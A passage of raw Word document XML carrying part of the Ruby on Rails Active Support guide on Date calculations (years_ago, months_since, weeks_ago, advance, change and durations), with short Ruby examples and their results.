        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5040"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6EE6A3F7" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4963D5D8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date = Date.new(2010, 6, 7)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="160F957D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date.years_since(10) # =&gt; Sun, 07 Jun 2020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="212D267B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If such a day does not exist, the last day of the corresponding month is returned:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7680"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="714266B1" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5C29F7F3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date.new(2012, 2, 29).years_ago(3)     # =&gt; Sat, 28 Feb 2009</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="511A191E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date.new(2012, 2, 29).years_since(3)   # =&gt; Sat, 28 Feb 2015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1B6A897E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">15.1.3.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>months_ago</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>months_since</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61295D8B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The methods </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>months_ago</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>months_since</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> work analogously for months:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7E5BC7C5" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0AF6953C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date.new(2010, 4, 30).months_ago(2)   # =&gt; Sun, 28 Feb 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30C7DC50" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date.new(2010, 4, 30).months_since(2) # =&gt; Wed, 30 Jun 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="220BC130" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If such a day does not exist, the last day of the corresponding month is returned:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7560"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4A26772A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="37FF0237" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date.new(2010, 4, 30).months_ago(2)    # =&gt; Sun, 28 Feb 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D04BF29" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date.new(2009, 12, 31).months_since(2) # =&gt; Sun, 28 Feb 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="40B655FB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">15.1.3.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>weeks_ago</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E0D6237" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>weeks_ago</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> works analogously for weeks:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7440"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3EB13F4B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="527D9E43" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date.new(2010, 5, 24).weeks_ago(1)    # =&gt; Mon, 17 May 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="382D58B7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date.new(2010, 5, 24).weeks_ago(2)    # =&gt; Mon, 10 May 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="30D5FFC8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">15.1.3.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>advance</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CC265D6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The most generic way to jump to other days is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>advance</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This method receives a hash with keys </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:years</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:months</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:weeks</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:days</w:t>
      </w:r>
      <w:r>
        <w:t>, and returns a date advanced as much as the present keys indicate:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7295"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="466C8043" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="68C995D6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date = Date.new(2010, 6, 6)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18861D71" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date.advance(:years</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :weeks</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2)  # =&gt; Mon, 20 Jun 2011</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C2444B3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date.advance(:months</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2, :days</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; -2) # =&gt; Wed, 04 Aug 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4B816048" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Note in the previous example that increments may be negative.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D57911C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>To perform the computation the method first increments years, then months, then weeks, and finally days. This order is important towards the end of months. Say for example we are at the end of February of 2010, and we want to move one month and one day forward.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6366A8AD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>advance</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> advances first one month, and then one day, the result is:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6455"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5A35E488" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7461D5F4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date.new(2010, 2, 28).advance(:months</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :days</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6859DB10" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Sun, 29 Mar 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="608D0893" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>While if it did it the other way around the result would be different:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7415"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4C3CDDC9" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D8EE112" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date.new(2010, 2, 28).advance(:days</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1).advance(:months</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D5D3813" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Thu, 01 Apr 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="56153A4A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>15.1.4 Changing Components</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="076A13A9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>change</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> allows you to get a new date which is the same as the receiver except for the given year, month, or day:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6815"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="21399F0A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0B80E7A8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date.new(2010, 12, 23).change(:year</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2011, :month</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 11)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B43C06A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Wed, 23 Nov 2011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3A971847" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This method is not tolerant to non-existing dates, if the change is invalid </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ArgumentError</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is raised:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4848"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7468C69B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="518B26DF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date.new(2010, 1, 31).change(:month</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="625F1300" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; ArgumentError: invalid date</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="72981FD1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>15.1.5 Durations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51098A56" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Durations can be added to and subtracted from dates:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
